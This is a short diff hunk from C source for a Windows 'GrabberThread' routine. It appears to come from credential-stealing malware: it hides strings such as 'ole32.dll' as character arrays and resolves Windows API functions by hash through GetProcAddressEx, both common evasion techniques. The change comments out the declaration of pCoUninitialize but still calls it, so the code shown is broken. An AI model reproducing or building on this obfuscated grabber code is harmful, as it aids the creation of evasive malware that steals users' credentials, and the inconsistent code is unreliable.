@@ -63,10 +63,10 @@ DWORD WINAPI GrabberThread( LPVOID lpData )
 	char GrabFTP[] = {'S','c','a','n','1', 0 };
 	char Ole32[]   = {'o','l','e','3','2','.','d','l','l', 0};
 
-	typedef void ( WINAPI *PCoUninitialize )();
+	//typedef void ( WINAPI *PCoUninitialize )();
 	typedef HRESULT ( WINAPI *PCoInitialize )( LPVOID lpReserved );
 
-	PCoUninitialize pCoUninitialize = (PCoUninitialize)GetProcAddressEx(Ole32, 0, 0xEDB3159D );
+	//PCoUninitialize pCoUninitialize = (PCoUninitialize)GetProcAddressEx(Ole32, 0, 0xEDB3159D );
 	PCoInitialize   pCoInitialize   = (PCoInitialize)GetProcAddressEx(Ole32, 0, 0xF341D5CF );
 		
 	pCoUninitialize();
